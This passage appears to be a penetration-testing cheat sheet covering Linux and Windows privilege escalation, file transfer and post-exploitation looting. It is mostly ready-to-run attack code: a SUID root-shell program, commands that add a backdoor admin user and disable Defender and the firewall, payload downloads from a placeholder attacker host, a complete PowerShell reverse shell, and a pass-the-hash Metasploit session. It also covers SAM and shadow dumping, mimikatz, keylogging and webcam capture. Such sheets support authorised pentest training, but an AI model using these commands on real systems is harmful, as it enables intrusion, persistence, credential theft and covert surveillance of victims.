grep -rnw '/' -ie 'DB_PASSWORD' --color=always
grep -rnw '/' -ie 'DB_USER' --color=always
```
### Scripts
#### SUID
```bash
int main(void){
  setresuid(0, 0, 0);
  system("/bin/bash");
}

# Compile
gcc suid.c -o suid
```
#### PS Monitor for cron
```bash
#!/bin/bash

# Loop by line
IFS=$'\n'

old_process=$(ps -eo command)

while true; do
	new_process=$(ps -eo command)
	diff <(echo "$old_process") <(echo "$new_process") | grep [\<\>]
	sleep 1
	old_process=$new_process
done
```
#### Linux Privesc Tools

[GTFOBins](https://gtfobins.github.io/)
[LinEnum](https://github.com/rebootuser/LinEnum)
[LinuxExploitSuggester](https://github.com/mzet-/linux-exploit-suggester)

### Linux Precompiled Exploits
[linuxprivchecker](https://github.com/sleventyeleven/linuxprivchecker)
## Windows

* Now we start the whole enumeration-process over gain. This is a checklist. You need to check of every single one, in this order.

1 ) Kernel exploits
2 ) Cleartext password
3 ) Reconfigure service parameters
4 ) Inside service
5 ) Program running as root
6 ) Installed software
7 ) Scheduled tasks
8 ) Weak passwords

### Basic info
```cmd
systeminfo
set
hostname
net users
net user user1
net localgroups
accesschk.exe -uwcqv "Authenticated Users" *

netsh firewall show state
netsh firewall show config

# Set path
set PATH=%PATH%;C:\xampp\php

whoami /priv

dir/a -> Show hidden & unhidden files
dir /Q -> Show permissions
```
### Kernel exploits
```cmd
# Look for hotfixes
systeminfo

wmic qfe get Caption,Description,HotFixID,InstalledOn

# Search for exploits
site:exploit-db.com windows XX XX
```
### Cleartext passwords
```cmd
# Windows autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"

# VNC
reg query "HKCU\Software\ORL\WinVNC3\Password"

# SNMP Parameters
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"

# Putty
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"

# Search for password in registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
```
### Reconfigure service parameters
*  Unquoted service paths

* Weak service permissions

https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/

### Dump process for passwords
```bash
# Looking for Firefox
Get-Process
./procdump64.exe -ma $PID-FF
Select-String -Path .\*.dmp -Pattern 'password' > 1.txt
type 1.txt | findstr /s /i "admin"
```
### Inside service
```cmd
netstat /a
netstat -ano
```
### Programs running as root/system

### Installed software
```cmd
tasklist /SVC
net start
reg query HKEY_LOCAL_MACHINE\SOFTWARE
DRIVERQUERY

Look in:
C:\Program files
C:\Program files (x86)
Home directory of the user
```
### Scheduled tasks
```cmd
schtasks /query /fo LIST /v

Check this file:
c:\WINDOWS\SchedLgU.Txt
```
### Weak passwords
```cmd
ncrack -vv --user george -P /usr/.../passwords.txt rdp://$IP
```
### Add user and enable RDP
```cmd
# Add new user

net user haxxor Haxxor123 /add
net localgroup Administrators haxxor /add
net localgroup "Remote Desktop Users" haxxor /ADD

# Turn firewall off and enable RDP

sc stop WinDefend
netsh advfirewall show allprofiles
netsh advfirewall set allprofiles state off
netsh firewall set opmode disable
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v UserAuthentication /t REG_DWORD /d 0 /f
```
### Powershell sudo for Windows
```bash
$pw= convertto-securestring "EnterPasswordHere" -asplaintext -force
$pp = new-object -typename System.Management.Automation.PSCredential -argumentlist "EnterDomainName\EnterUserName",$pw
$script = "C:\Users\EnterUserName\AppData\Local\Temp\test.bat"
Start-Process powershell -Credential $pp -ArgumentList '-noprofile -command &{Start-Process $script -verb Runas}'

powershell -ExecutionPolicy Bypass -File xyz.ps1
```
### Windows download with bitsadmin
```cmd
bitsadmin /transfer mydownloadjob /download /priority normal http://<attacker>/nc.exe C:\\Users\\%USERNAME%\\AppData\\local\\temp\\nc.exe
```
### Windows download with certutil.exe
```bash
certutil.exe -urlcache -split -f "http://<attacker>/Powerless.bat" Powerless.bat
```
### Windows download with powershell
```bash
powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.11.1.111/file.exe','C:\Users\user\Desktop\file.exe')"

(New-Object System.Net.WebClient).DownloadFile("http://10.11.1.111/CLSID.list","C:\Users\Public\CLSID.list")
```
### Windows Download from FTP
```bash
# In reverse shell
echo open $IP > ftp.txt
echo USER anonymous >> ftp.txt
echo ftp >> ftp.txt 
echo bin >> ftp.txt
echo GET file >> ftp.txt
echo bye >> ftp.txt

# Execute
ftp -v -n -s:ftp.txt
```
### Windows create SMB Server transfer files
```bash
# Attack machine
python /usr/share/doc/python-impacket/examples/smbserver.py 

	# Or SMB service 
	# http://www.mannulinux.org/2019/05/exploiting-rfi-in-php-bypass-remote-url-inclusion-restriction.html
	vim /etc/samba/smb.conf
		[global]
		workgroup = WORKGROUP
		server string = Samba Server %v
		netbios name = indishell-lab
		security = user
		map to guest = bad user
		name resolve order = bcast host
		dns proxy = no
		bind interfaces only = yes
	
		[ica]
		path = /var/www/html/pub
		writable = no
		guest ok = yes
		guest only = yes
		read only = yes
		directory mode = 0555
		force user = nobody

	chmod -R 777 smb_path
	chown -R nobody:nobody smb_path
	service smbd restart 

# Victim machine with reverse shell
Download: copy \\$IP\Lab\wce.exe . 
Upload: copy wtf.jpg \\$IP\Lab
```
### Windows download with VBS
```cmd
# In reverse shell
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http,varByteArray,strData,strBuffer,lngCounter,fs,ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET",strURL,False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile,True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1,1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs

# Execute
cscript wget.vbs http://10.11.1.111/file.exe file.exe
```
### Pass The Hash
```bash
# Login as user only with hashdump
# From this hashdump
# admin2:1000:aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7:::

msf5 > use exploit/windows/smb/psexec
msf5 exploit(windows/smb/psexec) > options

Module options (exploit/windows/smb/psexec):

   Name                  Current Setting  Required  Description
   ----                  ---------------  --------  -----------
   RHOSTS                                 yes       The target address range or CIDR identifier
   RPORT                 445              yes       The SMB service port (TCP)
   SERVICE_DESCR10.11.1.111TION                    no        Service description to to be used on target for pretty listing
   SERVICE_DISPLAY_NAME                   no        The service display name
   SERVICE_NAME                           no        The service name
   SHARE                 ADMIN$           yes       The share to connect to, can be an admin share (ADMIN$,C$,...) or a normal read/write folder share
   SMBDomain             .                no        The Windows domain to use for authentication
   SMBPass                                no        The password for the specified username
   SMBUser                                no        The username to authenticate as

Exploit target:

   Id  Name
   --  ----
   0   Automatic

msf5 exploit(windows/smb/psexec) > set rhosts 10.10.0.100
rhosts => 10.10.0.100

msf5 exploit(windows/smb/psexec) > set smbuser admin2

smbuser => admin2

msf5 exploit(windows/smb/psexec) > set smbpass aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7

smbpass => aad3b435b51404eeaad3b435b51404ee:7178d3046e7ccfac0469f95588b6bdf7

msf5 exploit(windows/smb/psexec) > set payload windows/x64/meterpreter/reverse_tcp

payload => windows/x64/meterpreter/reverse_tcp
```
### Scripts
		
#### Useradd
```c
#include <stdlib.h> /* system, NULL, EXIT_FAILURE */

int main ()
{
  int i;
  i=system ("net user <username> <password> /add && net localgroup administrators <username> /add");
  return 0;
}

# Compile
i686-w64-mingw32-gcc -o useradd.exe useradd.c
```
#### Powershell Run As
```cmd
echo $username = '<username>' > runas.ps1
echo $securePassword = ConvertTo-SecureString "<password>" -AsPlainText -Force >> runas.ps1
echo $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword >> runas.ps1
echo Start-Process C:\Users\User\AppData\Local\Temp\backdoor.exe -Credential $credential >> runas.ps1
```
#### Powershell Reverse Shell
```cmd
Set-ExecutionPolicy Bypass

$client = New-Object System.Net.Sockets.TCPClient('10.11.1.111',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
### Windows privesc/enum tools
- [windows-exploit-suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester/blob/master/windows-exploit-suggester.py)
- [windows-privesc-check](https://github.com/pentestmonkey/windows-privesc-check)
- [PowerUp](https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerUp/PowerUp.ps1)

### Windows precompiled exploits
- [WindowsExploits](https://github.com/abatchy17/WindowsExploits)
### Windows Port Forwarding
```sh
# Listen on local port 8080 and forward incoming traffic to REMOT_HOST:PORT via SSH_SERVER
# Scenario: access a host that's being blocked by a firewall via SSH_SERVER;
ssh -L 127.0.0.1:8080:REMOTE_HOST:PORT user@SSH_SERVER

# Run in victim (5985 WinRM):
plink -l LOCALUSER -pw LOCALPASSWORD LOCALIP -R 5985:127.0.0.1:5985 -P 221
```
# Loot :
## Linux

### Passwords and hashes
```bash
cat /etc/passwd
cat /etc/shadow

unshadow passwd shadow > unshadowed.txt
john --rules --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
```
### Dualhomed
```bash
ifconfig
ifconfig -a
arp -a
```
### Tcpdump
```bash
tcpdump -i any -s0 -w capture.pcap
tcpdump -i eth0 -w capture -n -U -s 0 src not $IP and dst not $IP
tcpdump -vv -i eth0 src not $IP and dst not $IP
```
### Interesting files
```bash
#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql
use auxiliary/sniffer/psnuffle

.ssh/
.bash_history
```
### Databases
```
```
### SSH-Keys
```bash
mkdir /root/.ssh 2>/dev/null; echo '<your ssh-key>' >> /root/.ssh/authorized_keys
```
### Browser

### Mail
```bash
/var/mail
/var/spool/mail
```
### GUI
If there is a gui we want to check out the browser.
```bash
echo $DESKTOP_SESSION
echo $XDG_CURRENT_DESKTOP
echo $GDMSESSION
```
## Windows
	
### Passwords and hashes
```bash
wce32.exe -w
wce64.exe -w
fgdump.exe

# Loot passwords without tools
reg.exe save hklm\sam c:\sam_backup
reg.exe save hklm\security c:\security_backup
reg.exe save hklm\system c:\system

# Meterpreter
hashdump
load mimikatz
msv
```
### Dualhomed
```bash
ipconfig /all
route print

# What other machines have been connected
arp -a
```
### Tcpdump
```bash
# Meterpreter
run packetrecorder -li
run packetrecorder -i 1
```
### Interesting files
```bash
#Meterpreter
search -f *.txt
search -f *.zip
search -f *.doc
search -f *.xls
search -f config*
search -f *.rar
search -f *.docx
search -f *.sql
hashdump
keysscan_start
keyscan_dump
keyscan_stop
webcam_snap

# How to cat files in meterpreter
cat c:\\Inetpub\\iissamples\\sdk\\asp\\components\\adrot.txt

# Recursive search
dir /s
```
